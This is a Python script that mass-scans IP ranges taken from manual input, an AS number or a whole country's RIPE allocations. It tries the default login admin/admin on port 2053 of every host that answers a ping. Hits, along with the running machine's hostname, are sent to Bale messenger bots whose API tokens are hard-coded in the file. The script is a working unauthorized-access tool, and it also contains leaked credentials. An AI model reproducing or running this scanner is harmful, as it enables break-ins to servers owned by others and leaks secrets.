import requests
import os
from time import localtime,time
from ping3 import ping
import platform
import ipaddress
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor



# Set the timeout for requests
# please set by network status
timeout = 1


time1 = time()

try:
    os.mkdir("data")
except:
    pass


with open("data/index.html", "a") as T:
    T.write('<style>*{text-align: center;color: aliceblue;background-color: black;}</style>\n<a href="iunknown.html">unknown</a>\n<a href="log.txt">log</a>\n<a href="ips.txt">ips</a> \n<a href="true.txt">true</a>\n<br/>')
    T.close()

with open("data/ips.txt", "a+") as T:
    T.write('')
    T.close()

def timer():
    return f"{localtime().tm_year}/{localtime().tm_mon}/{localtime().tm_mday} , {localtime().tm_hour}:{localtime().tm_min}"
    
def send(text):
    try:x=requests.post(f"https://tapi.bale.ai/bot899168976:CshJYXlBbgYpwCybOhQbq9mBGERAhAJga82uRv5q/sendMessage",json={"chat_id": "369363336", "text": f"{text}"})
    except:pass

def send_t(text):
    try:x=requests.post(f"https://tapi.bale.ai/bot912628592:RIidrxqrqTUdZWAJGkBhUy5ZOcSNrXQa1m4gLE4J/sendMessage",json={"chat_id": "369363336", "text": f"{text}"})
    except:pass

def loger(ip, port, text):
    """
    Log the result of checking the Plesk server at the given IP address and port.
    """
    with open("data/log.txt", "a+") as file:
        file.write(f"{ip}:{port} is {text} ({timer()})\n")


    if text == True:
        with open("data/index.html", "a+") as T:
            T.write(f"{ip}:{port} ({timer()})<br/>\n")
            T.close()
            send_t(f"http://{ip}:{port} ({timer()} CLI , {platform.system(), platform.uname().node})")            

        with open("data/true.txt", "a+") as T2:
            T2.write(f"{ip}:{port}\n")
            T2.close()

    elif text == False:
        pass
    else:
        with open("data/iunknown.html", "a+") as T:
            T.write(f"{ip}:{port} is {text} ({timer()})<br/>\n")
            T.close()
            send(f"{ip}:{port} is {text} ({timer()} CLI on {platform.system(), platform.uname().node})")
loger("info", "", "loger started")

def get_ip_ranges_from_as(as_number):
    url = f"https://api.bgpview.io/asn/{as_number}/prefixes"
    response = requests.get(url)
    if response.status_code != 200:
        print("خطا در دریافت اطلاعات")
        return []

    data = response.json()
    prefixes = data.get("data", {}).get("ipv4_prefixes", [])
    return [p["prefix"] for p in prefixes]

def save_ips_from_ranges(prefixes, filename):
    with open(filename, "w") as f:
        for prefix in prefixes:
            try:
                net = ipaddress.ip_network(prefix)
                for ip in net.hosts():
                    f.write(str(ip) + "\n")
            except Exception as e:
                print(f"خطا در پردازش {prefix}: {e}")


def get_ip_ranges_by_country(country_code):
    url = "https://ftp.ripe.net/pub/stats/ripencc/delegated-ripencc-latest"
    response = requests.get(url)
    if response.status_code != 200:
        print("خطا در دریافت اطلاعات RIPE")
        return []

    networks = []
    for line in response.text.splitlines():
        if f"|{country_code.upper()}|ipv4|" in line:
            parts = line.split("|")
            if len(parts) > 4:
                ip_start = parts[3]
                count = int(parts[4])
                try:
                    # تبدیل به رنج‌های کوچکتر با ipaddress
                    for net in ipaddress.summarize_address_range(
                        ipaddress.IPv4Address(ip_start),
                        ipaddress.IPv4Address(int(ipaddress.IPv4Address(ip_start)) + count - 1)
                    ):
                        networks.append(net)
                except Exception as e:
                    print(f"خطا در پردازش {ip_start} + {count}: {e}")
    return networks

def save_ips_to_file(ranges, filename="data/ips.txt"):
    with open(filename, "w") as f:
        for net in ranges:
            for ip in net.hosts():
                f.write(str(ip) + "\n")


def ip_to_int(ip):
    parts = list(map(int, ip.split('.')))
    return (parts[0] << 24) + (parts[1] << 16) + (parts[2] << 8) + parts[3]

def int_to_ip(num):
    return f"{(num >> 24) & 255}.{(num >> 16) & 255}.{(num >> 8) & 255}.{num & 255}"

def convert_seconds(seconds):
    days = seconds // (24 * 3600)
    seconds %= (24 * 3600)
    hours = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    return f"{days} days, {hours} hours, {minutes} minutes, {seconds} seconds"

# Example:
print(convert_seconds(539885))

def ip_range(ip1, ip2):
    try:
        start = ip_to_int(ip1)
        end = ip_to_int(ip2)
        
        if start > end:
            start, end = end, start
        
        for num in range(start, end + 1):
            ip = int_to_ip(num)
            with open("data/ips.txt", "a+") as my_file:
              my_file.write(f"{ip}\n")
    except ValueError:
        print("ip invalid")



inp = int(input("#Toomaj\n 1. Create new ip range manually \n 2. Create new ip range with AS \n 3. Continue with last ip range \n 4. Create new ip range with country \n==> "))
if inp == 1:
    my_file = open("data/ips.txt", "w")
    my_file.write("")
    my_file.close()
    while True:
        ip_range(input("first ip (X.X.X.X) ==>"),(input("Last ip (X.X.X.X)==>")))
        if input("do you want to add more ip range? Y/n ==> ").upper() == "Y":pass
        else:break
elif inp == 2 :
    my_file = open("data/ips.txt", "w")
    my_file.write("")
    my_file.close()
    AS_NUMBER = input("Enter as number (ASx) ==>")
    OUTPUT_FILE = "data/ips.txt"
    print(f"receving ip from {AS_NUMBER} ...")
    prefixes = get_ip_ranges_from_as(AS_NUMBER)
    if prefixes:
        print(f"{len(prefixes)} renges found, saving... ")
        save_ips_from_ranges(prefixes, OUTPUT_FILE)
        print(f"all ips saved to: {OUTPUT_FILE}.")

    else:
        print("nothing found")


elif inp == 3 :pass

elif inp == 4 :
    country = input("enter country code: ").strip().upper()
    print(f"receving ip from {country} ...")
    ip_ranges = get_ip_ranges_by_country(country)
    if ip_ranges:
        print(f"{len(ip_ranges)} renges found, saving... ")
        save_ips_to_file(ip_ranges)
        print(f"all ips saved.")
    else:
        print("رنجی پیدا نشد.")


else : print("wrong input")


max_workers = int(input("max_workers ==>"))

max_ip = int(input("max_ip(default : 10000) ==>"))


def checker(ip: str, timeout: int, port : int):
    """
    Check if the Plesk server at the given IP address and port 2083 is accessible.
    """
    try:
        url = f"http://{ip}:{port}/login"

        data = {'username': 'admin', 'password': 'admin'}

        response = requests.post(url, data, timeout=timeout)

        response_json = response.json()

        if response_json["success"]:
            return True
        else:
            return response_json['msg']
    except:
        return False

def scan_ip(ip):
    ip = ip.strip()
    if ping(ip, timeout) is not None:
        result = checker(ip, timeout, 2053)
        loger(ip, 2053, result)

def batch(iterable, n=10000):
    l = len(iterable)
    for ndx in range(0, l, n):
        yield iterable[ndx:min(ndx + n, l)]

with open("data/ips.txt", "r") as file:
    ips = file.readlines()

print(f"Estimated time: {convert_seconds(round(timeout * (len(ips)/max_workers)))} (approximate) and number of ip is : {len(ips)}")
print("start searching...")

pbar = tqdm(total=len(ips))  

for ips_batch in batch(ips, max_ip):
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        list(executor.map(scan_ip, ips_batch))
    pbar.update(len(ips_batch)) 
pbar.close()

time2 = time()

loger("info", "", "Done!")
input(f"press enter to close\n result in data folder \n The time it took to complete:{round(time2-time1)} second")

